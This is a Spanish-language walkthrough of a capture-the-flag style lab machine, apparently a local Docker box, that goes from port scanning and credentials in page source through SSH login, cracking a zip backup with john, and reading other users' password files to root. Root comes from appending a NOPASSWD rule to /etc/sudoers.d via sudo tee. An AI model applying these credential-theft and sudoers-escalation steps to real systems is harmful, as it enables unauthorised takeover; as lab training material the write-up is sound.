nmap: 80, 8899
![image](https://github.com/user-attachments/assets/3640f876-af5a-4520-8312-e1baa9297e3c)


---

en la pagina principal da un usuario "rosa" y posibles contraseñas en texto plano txt y un sha384:
![image](https://github.com/user-attachments/assets/e5b6b0b1-ddc1-46da-b4d1-14900eaf7de0)


      -UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1
los pasamos por un sha384: https://emn178.github.io/online-tools/sha384.html

y nos da: 

>e762c3709721038d65fa8365bbd50e88fd5515f56ee41c64e157607793d1bc8ce2ffd67a6e93431008b0cce67fa70c57

si voy a formulario de la pagina principal y voy al código fuente encontramos esto:
![image](https://github.com/user-attachments/assets/8332872b-8231-4713-8063-99ce0c01c9d9)

"rosa:lacagadenuevo" (posible contraseña)
probamos:

     - ssh rosa@172.18.0.2 -p 8899 (porque el puerto 22 esta cerrado)

vemos que podemos entrar:

![image](https://github.com/user-attachments/assets/f944088b-07c4-44f3-ab79-afb6f5c66152)


encontré esto:

![image](https://github.com/user-attachments/assets/5af3897b-ba52-4fde-be0a-01cd25f6cc20)


dentro vamos a la carpeta: cd > cd ./- > abrimos un servidor y en nuestro terminal un curl:

     curl http://172.18.0.2:8080/backup_rosa.zip --output rosa.zip

nos pasamos el zip

![image](https://github.com/user-attachments/assets/af76f6a6-3cb2-4d7c-845b-c4e590ebb4d1)


nos pide una contraseña así que intentamos un "john"

         zip2john rosa.zip > hash.txt
          john hash.txt

y nos da la contraseña:

![image](https://github.com/user-attachments/assets/bae5bb6f-8dd8-4cb1-b0b5-9010d2342f90)

ingresamos a la terminal victima y con la contraseña vemos lo que dice en "password.txt"
contraseña: hackwhitbash

![image](https://github.com/user-attachments/assets/f1011197-0a68-4287-ad10-2fdd0744a00f)

probamos con "juan" y ahora somos el usuario "juan"
con sudo -l  vemos que carlos ejecuta "tree / cat" 
colocamos:

    sudo -u carlos tree /home/carlos

da que tenemos un directorio con nombre "password" hacemos un
    
    sudo -u carlos cat /home/carlos/password

nos da la contraseña de carlos: chocolateado

![image](https://github.com/user-attachments/assets/5d1dc3c7-2eed-4025-b1fa-e872ee5c2348)



con sudo -l  y carlos ejecuta un "tee"
buscamos en: https://gtfobins.github.io/gtfobins/tee/
y seguimos los pasos:

    LFILE=/etc/sudoers.d/carlos
     echo "carlos ALL=(ALL) NOPASSWD: ALL" | sudo tee -a "$LFILE"

ejecutamos "sudo su"

![image](https://github.com/user-attachments/assets/65480878-01a8-47c0-a485-86d5116876ed)

 y somos root!.
